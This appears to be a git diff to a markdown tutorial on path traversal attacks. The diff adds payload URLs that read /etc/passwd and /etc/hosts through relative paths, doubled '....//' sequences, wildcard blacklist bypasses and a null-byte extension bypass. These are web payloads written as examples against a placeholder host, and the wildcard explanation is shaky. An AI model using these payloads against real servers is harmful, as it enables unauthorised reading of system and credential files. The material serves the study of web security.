@@ -22,15 +22,22 @@ In this type of Path traversal, results can be obtained by using the absolute pa
 ## Relative Path traversal.
 `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
 
-## Non-Recursive Sanitization Traversal
+## Non-Recursive Sanitization Traversal.
 In some cases, serialization techniques detect the path `../` and delete it. We can bypass this by doubling it and using `....//`:<br />
 `https://insecure-website.com/loadImage?filename=....//....//....//....//etc/passwd`
 
-## Black list bypass
+## Black list bypass.
 In other cases the server may have a black list that find some maches and invalidate them like `passwd`. We can bypass it using regular expresions `pass*`: <br />
-`https://insecure-website.com/loadImage?filename=....//....//....//....//etc/pass*`
+`https://insecure-website.com/loadImage?filename=....//....//....//....//etc/pass*`<br />
+`https://insecure-website.com/loadImage?filename=../../../../../etc/ho?ts`<br />
+`https://insecure-website.com/loadImage?filename=../../../../../e??/pa????`<br />
 
-## Null byte Path Traversal
 
+## Null byte Path Traversal.
+Sometimes the developer may concatenate an exension to the file being searched. In this case, if we attempt to obtain the `/etc/passwd` , we might actually be searching for `/etc/passwd.php`. We can avoid this technique (Only if the PHP version is outdated) by using a null byte to override the extension.<br />
+`https://insecure-website.com/loadImage?filename=../../../../../etc/passwd%00`<br />
+
+## Extension validation.
+Its possible to make the server just to search the files that contains an especific exetensin. For example, The target can only show a file if the file extension is not .txt.
 
 
